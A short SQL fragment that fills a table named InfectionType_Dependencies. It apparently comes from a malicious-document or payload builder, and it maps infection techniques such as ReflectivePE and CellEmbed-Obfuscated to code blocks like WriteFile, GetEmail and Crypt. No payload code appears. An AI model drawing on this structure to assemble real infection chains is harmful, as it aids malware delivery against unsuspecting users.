INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 1);  -- ReflectivePE             depends on GetVal
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 2);  -- ReflectivePE             depends on RandomName 
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 15); -- ReflectivePE             depends on WriteFile 
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (9, 1);  -- CellEmbed-Obfuscated      depends on GetVal 
--INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 1);  -- Encrypted                depends on GetVal
--INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 2);  -- Encrypted                depends on RandomName
--INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 11); -- Encrypted                depends on GetEmail
--INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 12); -- Encrypted                depends on Crypt
